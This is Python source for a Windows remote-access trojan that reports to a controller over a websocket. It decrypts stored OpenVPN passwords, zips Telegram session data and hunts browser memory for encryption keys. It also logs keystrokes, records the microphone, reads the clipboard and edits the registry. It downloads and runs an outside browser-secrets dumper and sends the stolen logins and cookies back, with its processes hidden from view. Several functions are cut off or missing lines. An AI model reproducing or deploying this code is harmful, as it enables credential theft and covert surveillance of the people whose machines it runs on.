def get_openvpn_passwords():
    results = []
    status_lines = []
    

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    
    creationflags = 0
    if sys.platform == 'win32':
        creationflags = subprocess.CREATE_NO_WINDOW  # 0x08000000
    
    try:

        ps_script = '''
        Add-Type -AssemblyName System.Security

        $results = @()
        $configs_path = "HKCU:\\Software\\OpenVPN-GUI\\configs"

        if (Test-Path $configs_path) {
            $keys = Get-ChildItem $configs_path

            foreach ($key in $keys) {
                $item = Get-ItemProperty $key.PSPath
                $encryptedBytes = $item.'auth-data'
                $entropy = $item.'entropy'

                if ($encryptedBytes -and $entropy) {
                    try {
                        $entropy = $entropy[0..($entropy.Length - 2)]
                        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
                            $encryptedBytes,
                            $entropy,
                            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
                        )
                        $password = [System.Text.Encoding]::Unicode.GetString($decryptedBytes)
                        
                        $username = ""
                        $auth_user = $item.'auth-user'
                        if ($auth_user) {
                            $username = $auth_user
                        }
                        
                        $results += [PSCustomObject]@{
                            ConfigName = $key.PSChildName
                            Username = $username
                            Password = $password
                            Path = $key.PSPath
                        }
                    } catch {
                        $results += [PSCustomObject]@{
                            ConfigName = $key.PSChildName
                            Username = "ERROR"
                            Password = "Failed to decrypt: $($_.Exception.Message)"
                            Path = $key.PSPath
                        }
                    }
                } else {
                    $results += [PSCustomObject]@{
                        ConfigName = $key.PSChildName
                        Username = "N/A"
                        Password = "No credentials stored"
                        Path = $key.PSPath
                    }
                }
            }
        }

        $results | ConvertTo-Json -Compress -Depth 10
        '''
        

        result = subprocess.run(

            startupinfo=startupinfo,
            creationflags=creationflags
        )
        
        if result.returncode == 0 and result.stdout.strip():
            try:
                import json as json_lib
                ps_results = json_lib.loads(result.stdout)
                

                if isinstance(ps_results, list):
                    for item in ps_results:
                        results.append({
                            'config': item.get('ConfigName', 'Unknown'),

    except Exception as e:
        status_lines.append(f"    ❌ Error: {str(e)[:100]}")
    
    return results, status_lines

def zip_tdata_folder(tdata_path, output_zip_path):
    import zipfile
    
    try:
        with zipfile.ZipFile(output_zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, os.path.dirname(tdata_path))
                    zipf.write(file_path, arcname)
        return True, output_zip_path
    except Exception as e:
        return False, str(e)

def find_chrome_processes():

    processes = []
    
    TH32CS_SNAPPROCESS = 0x00000002
    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snapshot == -1:
        return processes
    
    pe32 = PROCESSENTRY32W()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    
    if kernel32.Process32FirstW(snapshot, ctypes.byref(pe32)):
        while True:
            exe_name = pe32.szExeFile.lower()
            if any(browser in exe_name for browser in ['chrome.exe', 'msedge.exe', 'brave.exe']):
                processes.append({
                    'pid': pe32.th32ProcessID,
                    'name': exe_name,
                    'parent_pid': pe32.th32ParentProcessID
                })
            
            if not kernel32.Process32NextW(snapshot, ctypes.byref(pe32)):
                break
    
    kernel32.CloseHandle(snapshot)
    return processes

def get_process_handle(pid):
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    PROCESS_VM_OPERATION = 0x0008
    
    handle = kernel32.OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION,
        False, pid
    )
    return handle



def search_key_in_dump(dump_path):

    if not os.path.exists(dump_path):
        return None
    


    patterns = [
        b'app_bound_encrypted_key',
        b'encrypted_key',
        b'app_bound_key',
        b'_key\x00',
    ]
    

    file_size = os.path.getsize(dump_path)
    if file_size > 500 * 1024 * 1024:  
        return None
    
    try:
        with open(dump_path, 'rb') as f:
            data = f.read()
        

        candidates = []
        

        for pattern in patterns:
            pos = data.find(pattern)
            if pos != -1:

                search_zone = data[pos:pos + 512]

                for i in range(0, len(search_zone) - 32):
                    block = search_zone[i:i+32]

                    if is_high_entropy(block):
                        candidates.append(block)
        


        for i in range(0, min(len(data), 50 * 1024 * 1024) - 32, 64):  
            block = data[i:i+32]
            entropy = calculate_entropy(block)
            if entropy > 6.5:
                candidates.append(block)
        

        unique = []
        for c in candidates:
            if c not in unique:
                unique.append(c)
        
        return unique[:10]  
    except:
        return None

def is_high_entropy(data):

    if len(data) < 16:
        return False

    unique = len(set(data))
    return unique > 20  

def calculate_entropy(data):

    if not data:
        return 0
    
    from collections import Counter
    byte_counts = Counter(data)
    length = len(data)
    
    entropy = 0
    for count in byte_counts.values():
        p = count / length
        entropy -= p * (p.bit_length() - 1 if p > 0 else 0)
    
    return entropy

def dpapi_decrypt(encrypted_bytes):

    try:
        if not encrypted_bytes:
            return None
        p = ctypes.create_string_buffer(encrypted_bytes, len(encrypted_bytes))
        blobin = DATA_BLOB(ctypes.sizeof(p), p)
        blobout = DATA_BLOB()
        ret = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
        if ret:
            cbData = int(blobout.cbData)
            pbData = blobout.pbData
            buffer = ctypes.create_string_buffer(cbData)
            ctypes.memmove(buffer, pbData, cbData)
            ctypes.windll.kernel32.LocalFree(pbData)
            return buffer.raw
    except Exception:
        pass
    return None

def registry_list_keys(key_path):

    try:

        parts = key_path.split('\\', 1)
        hive_name = parts[0]
        subkey = parts[1] if len(parts) > 1 else ""
        

        hives = {
            'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
            'HKCR': winreg.HKEY_CLASSES_ROOT,
            'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
            'HKCU': winreg.HKEY_CURRENT_USER,
            'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
            'HKLM': winreg.HKEY_LOCAL_MACHINE,
            'HKEY_USERS': winreg.HKEY_USERS,
            'HKU': winreg.HKEY_USERS,
            'HKEY_CURRENT_CONFIG': winreg.HKEY_CURRENT_CONFIG,
            'HKCC': winreg.HKEY_CURRENT_CONFIG
        }
        
        if hive_name not in hives:
            return {'error': f'Unknown hive: {hive_name}'}
        
        hive = hives[hive_name]
        
        result = {
            'path': key_path,
            'subkeys': [],
            'values': []
        }
        
        try:
            key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ)
            

            i = 0
            while True:
                try:
                    subkey_name = winreg.EnumKey(key, i)
                    result['subkeys'].append(subkey_name)
                    i += 1
                except OSError:
                    break
            

            i = 0
            while True:
                try:
                    value_name, value_data, value_type = winreg.EnumValue(key, i)

                    if value_type == winreg.REG_BINARY:
                        if len(value_data) > 64:
                            display_data = value_data[:64].hex() + '...'
                        else:
                            display_data = value_data.hex()
                    elif value_type == winreg.REG_DWORD:
                        display_data = str(value_data)
                    elif value_type == winreg.REG_QWORD:
                        display_data = str(value_data)
                    elif value_type == winreg.REG_SZ or value_type == winreg.REG_EXPAND_SZ:
                        display_data = str(value_data)
                    else:
                        display_data = f'[{value_type}] {value_data[:50]}'
                    
                    result['values'].append({
                        'name': value_name if value_name else '(Default)',
                        'data': display_data,
                        'type': value_type,
                        'raw_data': base64.b64encode(value_data).decode() if isinstance(value_data, bytes) else value_data
                    })
                    i += 1
                except OSError:
                    break
            
            winreg.CloseKey(key)
            
        except Exception as e:
            result['error'] = str(e)
        
        return result
        
    except Exception as e:
        return {'error': str(e), 'path': key_path}

def registry_delete_key(key_path):

    try:
        parts = key_path.split('\\', 1)
        hive_name = parts[0]
        subkey = parts[1] if len(parts) > 1 else ""
        
        hives = {
            'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
            'HKCR': winreg.HKEY_CLASSES_ROOT,
            'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
            'HKCU': winreg.HKEY_CURRENT_USER,
            'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
            'HKLM': winreg.HKEY_LOCAL_MACHINE,
            'HKEY_USERS': winreg.HKEY_USERS,
            'HKU': winreg.HKEY_USERS,
        }
        
        if hive_name not in hives:
            return {'error': f'Unknown hive: {hive_name}'}
        
        hive = hives[hive_name]

        def recursive_delete(hkey, subkey_path):
            try:
                key = winreg.OpenKey(hkey, subkey_path, 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        sub = winreg.EnumKey(key, 0)
                        recursive_delete(hkey, subkey_path + '\\' + sub)
                    except OSError:
                        break
                winreg.CloseKey(key)
                winreg.DeleteKey(hkey, subkey_path)
            except:
                pass
        
        recursive_delete(hive, subkey)
        return {'success': True, 'path': key_path}
    except Exception as e:
        return {'error': str(e)}

def registry_create_value(key_path, value_name, value_data, value_type):

    try:
        parts = key_path.split('\\', 1)
        hive_name = parts[0]
        subkey = parts[1] if len(parts) > 1 else ""
        
        hives = {
            'HKEY_CLASSES_ROOT': winreg.HKEY_CLASSES_ROOT,
            'HKCR': winreg.HKEY_CLASSES_ROOT,
            'HKEY_CURRENT_USER': winreg.HKEY_CURRENT_USER,
            'HKCU': winreg.HKEY_CURRENT_USER,
            'HKEY_LOCAL_MACHINE': winreg.HKEY_LOCAL_MACHINE,
            'HKLM': winreg.HKEY_LOCAL_MACHINE,
            'HKEY_USERS': winreg.HKEY_USERS,
            'HKU': winreg.HKEY_USERS,
        }
        
        if hive_name not in hives:
            return {'error': f'Unknown hive: {hive_name}'}
        
        hive = hives[hive_name]
        

        reg_type_map = {
            'REG_SZ': winreg.REG_SZ,
            'REG_EXPAND_SZ': winreg.REG_EXPAND_SZ,
            'REG_DWORD': winreg.REG_DWORD,
            'REG_QWORD': winreg.REG_QWORD,
            'REG_BINARY': winreg.REG_BINARY,
        }
        
        reg_type = reg_type_map.get(value_type, winreg.REG_SZ)
        

        if reg_type == winreg.REG_DWORD:
            value_data = int(value_data)
        elif reg_type == winreg.REG_QWORD:
            value_data = int(value_data)
        elif reg_type == winreg.REG_BINARY:
            value_data = bytes.fromhex(value_data) if isinstance(value_data, str) else value_data
        
        key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, value_name if value_name != '(Default)' else '', 0, reg_type, value_data)
        winreg.CloseKey(key)
        
        return {'success': True, 'path': key_path, 'value_name': value_name}
    except Exception as e:
        return {'error': str(e)}

def get_all_windows():

    windows = []
    
    def callback(hwnd, lparam):
        if IsWindowVisible(hwnd):

            length = GetWindowTextLengthW(hwnd)
            if length > 0:
                buffer = ctypes.create_unicode_buffer(length + 1)
                GetWindowTextW(hwnd, buffer, length + 1)
                title = buffer.value
                if title and not title.startswith('Program Manager'):
                    windows.append(hwnd)
        return True
    
    EnumWindows(EnumWindowsProc(callback), 0)
    return windows

def get_window_rect(hwnd):

    rect = RECT()
    GetWindowRect(hwnd, ctypes.byref(rect))
    return rect.left, rect.top, rect.right, rect.bottom

def set_window_pos(hwnd, x, y):

    SetWindowPos(hwnd, HWND_TOP, x, y, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE)

def window_shake_thread():

    global window_shake_running
    
    while window_shake_running:
        try:
            windows = get_all_windows()
            if not windows:
                time.sleep(0.2)
                continue
            

            original_positions = {}
            for hwnd in windows:
                try:
                    x, y, _, _ = get_window_rect(hwnd)
                    original_positions[hwnd] = (x, y)
                except:
                    pass
            

            intensity = 6  
            
            while window_shake_running:
                for hwnd, (orig_x, orig_y) in original_positions.items():
                    try:

                        offset_x = random.randint(-intensity, intensity)
                        offset_y = random.randint(-intensity, intensity)
                        set_window_pos(hwnd, orig_x + offset_x, orig_y + offset_y)
                    except:
                        pass
                
                time.sleep(0.04)  
                
        except Exception as e:
            print(f"Window shake error: {e}")
            time.sleep(1)

def draw_ghost(x, y, alpha=255):

    try:

        hwnd = user32_for_trail.GetDesktopWindow()
        dc = user32_for_trail.GetDC(hwnd)
        


        hBrush = gdi32.CreateSolidBrush(0x008888FF)  # RGB: 255, 136, 0
        

        gdi32.SelectObject(dc, hBrush)
        gdi32.Ellipse(dc, x - MOUSE_TRAIL_DOT_SIZE//2, y - MOUSE_TRAIL_DOT_SIZE//2,
                      x + MOUSE_TRAIL_DOT_SIZE//2, y + MOUSE_TRAIL_DOT_SIZE//2)
        
        gdi32.DeleteObject(hBrush)
        user32_for_trail.ReleaseDC(hwnd, dc)
    except:
        pass

def clear_all_ghosts():

    try:

        user32_for_trail.InvalidateRect(0, None, True)
        user32_for_trail.UpdateWindow(user32_for_trail.GetDesktopWindow())
    except:
        pass

def mouse_trail_thread_func():

    global mouse_trail_running, mouse_trail_positions
    
    last_x, last_y = get_cursor_pos()
    frames_since_last = 0
    
    while mouse_trail_running:
        try:
            current_x, current_y = get_cursor_pos()
            

            if abs(current_x - last_x) > 3 or abs(current_y - last_y) > 3:

                mouse_trail_positions.append((current_x, current_y, time.time()))
                

                while len(mouse_trail_positions) > MOUSE_TRAIL_MAX:
                    mouse_trail_positions.pop(0)
                
                last_x, last_y = current_x, current_y
                frames_since_last = 0
            else:
                frames_since_last += 1
                if frames_since_last > 30:  

                    mouse_trail_positions = []
                    clear_all_ghosts()
                    frames_since_last = 0
        except:
            pass
        
        time.sleep(0.05)

            user32_for_trail.ReleaseDC(desktop_hwnd, dc)
            
        except Exception as e:
            pass
        
        time.sleep(0.033)

def get_netstat():

    results = []
    connections = []
    
    try:

        result = subprocess.run(
            'netstat -an',
            shell=True, capture_output=True, text=True, timeout=15,
            encoding='cp866', errors='replace'
        )
        
        lines = result.stdout.split('\n')
        
        for line in lines:
            parts = line.split()
            if len(parts) >= 4:
                proto = parts[0]
                local_addr = parts[1]
                foreign_addr = parts[2]
                state = parts[3] if len(parts) > 3 else ''
                

                status = 'unknown'
                color = '#888888'
                
                if state == 'ESTABLISHED':
                    status = 'established'
                    color = '#00ff00'  
                elif state == 'TIME_WAIT':
                    status = 'time_wait'
                    color = '#ff4444'  
                elif state == 'CLOSE_WAIT':
                    status = 'close_wait'
                    color = '#ff8844'  
                elif state == 'LISTENING':
                    status = 'listening'
                    color = '#00ccff'  
                elif 'SYN' in state:
                    status = 'syn'
                    color = '#ffff44'  
                elif state == 'CLOSED':
                    status = 'closed'
                    color = '#ff44ff'  
                

                local_parts = local_addr.split(':')
                local_port = local_parts[-1] if len(local_parts) > 1 else ''
                

                foreign_parts = foreign_addr.split(':')
                foreign_port = foreign_parts[-1] if len(foreign_parts) > 1 else ''
                
                connections.append({
                    'proto': proto,
                    'local_addr': local_addr,
                    'local_port': local_port,
                    'foreign_addr': foreign_addr,
                    'foreign_port': foreign_port,
                    'state': state,
                    'status': status,
                    'color': color
                })
        

        results = connections[:200]
        
    except Exception as e:
        results = []
    
    return results

VK_CAPITAL = 0x14
VK_SHIFT = 0x10


MAPVK_VK_TO_VSC = 0

def get_keyboard_state(shift_pressed, caps_on):

    state = (ctypes.c_byte * 256)()
    if shift_pressed:
        state[VK_SHIFT] = 0x80
    if caps_on:

        pass
    return state

def get_real_char(vk_code, shift_pressed, caps_on):

    try:

        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        layout = user32.GetKeyboardLayout(thread_id)
        

        scan_code = user32.MapVirtualKeyExW(vk_code, MAPVK_VK_TO_VSC, layout)
        

        state = (ctypes.c_byte * 256)()
        if shift_pressed:
            state[VK_SHIFT] = 0x80
        

        buffer = ctypes.create_unicode_buffer(8)
        


        result = user32.ToUnicodeEx(
            vk_code, scan_code, state, buffer, 8, 0, layout
        )
        
        if result > 0:
            char = buffer.value
            if char and char[0] != '\x00':

                if caps_on and char.isalpha():
                    if shift_pressed:
                        char = char.lower()
                    else:
                        char = char.upper()
                return char
    except Exception:
        pass
    return None

def is_capslock_on():

    return user32.GetKeyState(VK_CAPITAL) & 0x0001 != 0

def is_shift_pressed():

    return user32.GetAsyncKeyState(VK_SHIFT) & 0x8000 != 0

def get_vk_code_from_key(key):

    try:
        if hasattr(key, 'vk'):
            return key.vk
        if hasattr(key, 'value') and hasattr(key.value, 'vk'):
            return key.value.vk
        if hasattr(key, 'char') and key.char and len(key.char) == 1:
            char = key.char
            if not char:
                return None

            vk = user32.VkKeyScanExW(ord(char), user32.GetKeyboardLayout(0))
            return vk & 0xFF
        return None
    except:
        return None

current_keyboard_layout = 0x0409  

def update_keyboard_layout():

    global current_keyboard_layout
    try:

        hwnd = user32.GetForegroundWindow()
        if hwnd:

            thread_id = user32.GetWindowThreadProcessId(hwnd, None)

            layout = user32.GetKeyboardLayout(thread_id)
            current_keyboard_layout = layout & 0xFFFF
    except Exception as e:
        pass

def get_keyboard_layout_name():

    try:
        hwnd = user32.GetForegroundWindow()
        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        layout = user32.GetKeyboardLayout(thread_id)
        layout_id = layout & 0xFFFF
        lang_name = ctypes.create_unicode_buffer(64)
        user32.GetLocaleInfoW(layout_id, 0x00000004, lang_name, 64)
        return lang_name.value.lower()
    except:
        return "en"

def is_russian_layout():

    update_keyboard_layout()  
    return current_keyboard_layout in [0x0419, 0x0819, 0x0C19, 0x041A, 0x0456, 0x0856, 0x0C56, 0x1856, 0x2856]

def is_english_layout():

    update_keyboard_layout()  
    return current_keyboard_layout in [0x0409, 0x0809, 0x0C09, 0x1009, 0x1409, 0x1809]

def get_current_layout_id():

    try:

        thread_id = user32.GetWindowThreadProcessId(hwnd, None)
        layout = user32.GetKeyboardLayout(thread_id)

def on_press(key):
    global keylogger_queue, keylogger_main_loop, keylogger_running
    if not keylogger_running or keylogger_queue is None:
        return
    
    try:
        key_str = str(key)
        
        # === СПЕЦИАЛЬНЫЕ КЛАВИШИ ===
        special_ignore = ['Key.enter', 'Key.shift', 'Key.shift_r', 'Key.ctrl_l', 'Key.ctrl_r',
                          'Key.alt_l', 'Key.alt_r', 'Key.cmd', 'Key.cmd_r', 'Key.tab']
        
        if key_str in special_ignore:
            return
        
        if 'enter' in key_str.lower():
            return
        
        if key_str == 'Key.space':
            asyncio.run_coroutine_threadsafe(keylogger_queue.put(' '), keylogger_main_loop)
            return
        
        if key_str == 'Key.backspace':
            asyncio.run_coroutine_threadsafe(keylogger_queue.put('[BACKSPACE]'), keylogger_main_loop)
            return
        
        special_map = {
            'Key.delete': '[DEL]', 'Key.esc': '[ESC]', 'Key.up': '[UP]', 'Key.down': '[DOWN]',
            'Key.left': '[LEFT]', 'Key.right': '[RIGHT]', 'Key.home': '[HOME]', 'Key.end': '[END]',
            'Key.page_up': '[PGUP]', 'Key.page_down': '[PGDN]',
        }
        
        if key_str in special_map:
            asyncio.run_coroutine_threadsafe(keylogger_queue.put(special_map[key_str]), keylogger_main_loop)
            return
        
        if 'f' in key_str and len(key_str) <= 6 and key_str[1:].isdigit():
            asyncio.run_coroutine_threadsafe(keylogger_queue.put(f'[F{key_str[1:]}]'), keylogger_main_loop)
            return
        


        vk_code = get_vk_code_from_key(key)
        
        if vk_code is not None:
            caps = is_capslock_on()
            shift = is_shift_pressed()
            

            char = get_real_char(vk_code, shift, caps)
            
            if char:
                asyncio.run_coroutine_threadsafe(keylogger_queue.put(char), keylogger_main_loop)
                return
        

        if hasattr(key, 'char') and key.char and len(key.char) == 1:
            char = key.char
            caps = is_capslock_on()
            shift = is_shift_pressed()
            
            if caps and char.isalpha():
                if shift:
                    char = char.lower()
                else:
                    char = char.upper()
            
            asyncio.run_coroutine_threadsafe(keylogger_queue.put(char), keylogger_main_loop)
            
    except Exception as e:
        pass

def start_keylogger_hook():
    global keylogger_listener, keylogger_running
    if keylogger_listener and keylogger_listener.is_alive():
        return False
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    keylogger_running = True
    return True

def stop_keylogger_hook():
    global keylogger_listener, keylogger_running
    keylogger_running = False
    if keylogger_listener and keylogger_listener.is_alive():
        keylogger_listener.stop()
    keylogger_listener = None

    async def start_keylogger_with_timer(self, duration_seconds):

        if not KEYLOGGER_ENABLED:
            await self.ws.send(json.dumps({
                "type": "keylog_timer_result",
                "success": False,
                "msg": "Keylogger module disabled in this build",
                "agent_id": self.agent_id
            }))
            return
        if not HAS_PYNPUT:
            await self.ws.send(json.dumps({
                "type": "keylog_timer_result",
                "success": False,
                "msg": "pynput not installed. Run: pip install pynput",
                "agent_id": self.agent_id
            }))
            return
        
        global keylogger_running, keylogger_queue, keylogger_main_loop
        
        if keylogger_running:
            await self.stop_keylogger({})
            await asyncio.sleep(1)
        
        
        log_buffer = []
        timestamp_start = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        keylogger_queue = asyncio.Queue()
        keylogger_main_loop = asyncio.get_running_loop()
        
        def on_press_with_buffer(key):
            try:
                key_str = str(key)
                if 'Key.' in key_str:
                    if 'space' in key_str:
                        log_buffer.append(' ')
                    elif 'enter' in key_str:
                        log_buffer.append('\n')
                    elif 'backspace' in key_str:
                        if log_buffer:
                            log_buffer.pop()
                    else:
                        log_buffer.append(f'[{key_str.replace("Key.", "").upper()}]')
                else:
                    log_buffer.append(key_str.replace("'", ""))
            except:
                pass
        
        def start_listener():
            from pynput import keyboard
            with keyboard.Listener(on_press=on_press_with_buffer) as listener:
                listener.join()
        
        listener_thread = threading.Thread(target=start_listener, daemon=True)
        listener_thread.start()
        keylogger_running = True
        
        await asyncio.sleep(duration_seconds)
        
        keylogger_running = False
        
        log_content = ''.join(log_buffer)
        if not log_content:
            log_content = "[No keys pressed during recording]"
        
        hostname = socket.gethostname()
        filename = f"keylog_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"Keylog from {hostname}\n")
                f.write(f"Started: {timestamp_start}\n")
                f.write(f"Duration: {duration_seconds} seconds\n")
                f.write("=" * 50 + "\n\n")
                f.write(log_content)
            
            with open(filename, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            await self.ws.send(json.dumps({
                "type": "keylog_timer_result",
                "success": True,
                "filename": filename,
                "data": file_data,
                "hostname": hostname,
                "duration": duration_seconds,
                "agent_id": self.agent_id
            }))
            
            if os.path.exists(filename):
                os.remove(filename)
            
        except Exception as e:
            await self.ws.send(json.dumps({
                "type": "keylog_timer_result",
                "success": False,
                "msg": str(e),
                "agent_id": self.agent_id
            }))

    async def start_microphone_recording(self, duration_seconds, device_index=None):

        if not MIC_ENABLED or not AUDIO_ENABLED:
            await self.ws.send(json.dumps({
                "type": "mic_recording_result",
                "success": False,
                "msg": "Microphone recording module disabled in this build",
                "agent_id": self.agent_id
            }))
            return
        if not HAS_PYAUDIO:
            await self.ws.send(json.dumps({
                "type": "mic_recording_result",
                "success": False,
                "msg": "PyAudio not installed",
                "agent_id": self.agent_id
            }))
            return
        
        try:
            import wave
            
            FORMAT = pyaudio.paInt16
            CHANNELS = 1
            RATE = 44100
            CHUNK = 1024
            
            if device_index is None:
                device_index = self.audio.get_default_input_device_info()['index']
            
            stream = self.audio.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                input_device_index=device_index,
                frames_per_buffer=CHUNK
            )
            
            frames = []
            start_time = time.time()
            
            while time.time() - start_time < duration_seconds:
                data = stream.read(CHUNK, exception_on_overflow=False)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            
            hostname = socket.gethostname()
            filename = f"mic_{hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            
            wf = wave.open(filename, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(self.audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            with open(filename, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            await self.ws.send(json.dumps({
                "type": "mic_recording_result",
                "success": True,
                "filename": filename,
                "data": file_data,
                "hostname": hostname,
                "duration": duration_seconds,
                "agent_id": self.agent_id
            }))
            
            # Clean up
            if os.path.exists(filename):
                os.remove(filename)
            
        except Exception as e:
            await self.ws.send(json.dumps({
                "type": "mic_recording_result",
                "success": False,
                "msg": str(e),
                "agent_id": self.agent_id
            }))

            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0


            cmd = f'schtasks /query /tn "{task_name}" /fo list /v'

            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=15,
                encoding='cp866',      
                errors='replace',
                startupinfo=startupinfo,
                creationflags=creationflags
            )

                error_msg = result.stderr.strip() or result.stdout.strip() or "Unknown error"
                await self.ws.send(json.dumps({
                    "type": "task_details",
                    "error": f"Failed to query task: {error_msg}",
                    "task_name": task_name,
                    "agent_id": self.agent_id
                }))
                return


            details = {}
            current_key = None
            for line in result.stdout.splitlines():
                line = line.strip()
                if not line:
                    continue
                if ':' in line:
                    key, value = line.split(':', 1)
                    key = key.strip()
                    value = value.strip()
                    details[key] = value
                    current_key = key
                elif current_key and line:

                    details[current_key] += " " + line.strip()


            await self.ws.send(json.dumps({
                "type": "task_details",
                "data": details,
                "task_name": task_name,
                "agent_id": self.agent_id,
                "raw_output": result.stdout[:5000]  
            }))

        except subprocess.TimeoutExpired:
            await self.ws.send(json.dumps({
                "type": "task_details",
                "error": "Command timed out",
                "task_name": task_name,
                "agent_id": self.agent_id
            }))
        except Exception as e:
            await self.ws.send(json.dumps({
                "type": "task_details",
                "error": str(e),
                "task_name": task_name,
                "agent_id": self.agent_id
            }))

    async def clipboard_read(self):

        try:

            ps_cmd = '''
            [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
            Add-Type -AssemblyName System.Windows.Forms
            $text = [System.Windows.Forms.Clipboard]::GetText()
            if ($text) {
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
                [System.Console]::OpenStandardOutput().Write($bytes, 0, $bytes.Length)
            }
            '''
            
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            creationflags = subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            
            result = subprocess.run(
                ['powershell', '-NoProfile', '-Command', ps_cmd],
                capture_output=True, timeout=5,
                startupinfo=startupinfo, creationflags=creationflags
            )
            

            content = result.stdout.decode('utf-8', errors='replace').strip()
            
            if not content:
                content = "[Empty clipboard]"
                
            await self.ws.send(json.dumps({"type": "clipboard_result", "data": content}))
            
        except subprocess.TimeoutExpired:
            await self.ws.send(json.dumps({"type": "clipboard_result", "data": "[Timeout]"}))
        except Exception as e:
            await self.ws.send(json.dumps({"type": "clipboard_result", "data": f"[Error: {str(e)}]"}))

    async def get_browser_credentials(self):
        try:
            await self.ws.send(json.dumps({
                "type": "browser_creds_status",
                "msg": "Downloading DumpBrowserSecrets tool..."
            }))
            
            exe_path = r"C:\Users\Public\DumpBrowserSecrets.exe"
            work_dir = r"C:\Users\Public"
            output_file = r"C:\Users\Public\output.txt"
            
            if not os.path.exists(exe_path):
                def download_file():
                    import urllib.request
                    import subprocess
                    url = "https://github.com/Maldev-Academy/DumpBrowserSecrets/releases/download/v1.2.0/DumpBrowserSecrets.exe"
                    
                    try:
                        urllib.request.urlretrieve(url, exe_path)
                    except:
                        subprocess.run(
                            f'powershell -Command "Invoke-WebRequest -Uri {url} -OutFile {exe_path}"',
                            shell=True, capture_output=True
                        )
                    return True
                
                await asyncio.to_thread(download_file)
            
            if not os.path.exists(exe_path):
                await self.ws.send(json.dumps({
                    "type": "error",
                    "msg": "Failed to download DumpBrowserSecrets.exe"
                }))
                return
            
            await self.ws.send(json.dumps({
                "type": "browser_creds_status",
                "msg": "Running DumpBrowserSecrets with /b:All (30-60 seconds)..."
            }))
            
            def run_extractor():
                cmd = f'"{exe_path}" /b:All > "{output_file}" 2>&1'
                result = subprocess.run(
                    cmd,
                    shell=True,
                    cwd=work_dir,
                    capture_output=True,
                    text=True,
                    encoding='cp866',
                    errors='replace'
                )
                return result.stdout, result.stderr
            
            stdout, stderr = await asyncio.to_thread(run_extractor)
            
            console_output = ""
            if os.path.exists(output_file):
                def read_output():
                    with open(output_file, 'r', encoding='utf-8', errors='replace') as f:
                        return f.read()
                console_output = await asyncio.to_thread(read_output)
            
            json_files = []
            for f in os.listdir(work_dir):
                if f.endswith('.json') and f not in ['output.txt', 'temp_agent.py', 'temp_agent.spec']:
                    if 'Data' in f or any(browser in f for browser in ['Chrome', 'Edge', 'Firefox', 'Brave']):
                        json_files.append(f)
            
            if not json_files:
                # Очистка перед выходом
                try:
                    if os.path.exists(exe_path):
                        os.remove(exe_path)
                    if os.path.exists(output_file):
                        os.remove(output_file)
                except:
                    pass
                
                await self.ws.send(json.dumps({
                    "type": "browser_creds_result",
                    "data": [],
                    "status": f"Console output:\n{console_output}\nSTDERR:\n{stderr}",
                    "msg": "No JSON files created"
                }))
                return
            
            all_logins = []
            all_cookies = []
            
            for json_file in json_files:
                json_path = os.path.join(work_dir, json_file)
                
                await self.ws.send(json.dumps({
                    "type": "browser_creds_status",
                    "msg": f"📄 Reading {json_file}..."
                }))
                
                def read_json():
                    with open(json_path, 'r', encoding='utf-8-sig', errors='replace') as f:
                        return json.load(f)
                
                try:
                    data = await asyncio.to_thread(read_json)
                    
                    browser_name = json_file.replace('Data.json', '').replace('Data', '')
                    if not browser_name or browser_name == json_file:
                        if 'Chrome' in json_file:
                            browser_name = 'Chrome'
                        elif 'Edge' in json_file:
                            browser_name = 'Edge'
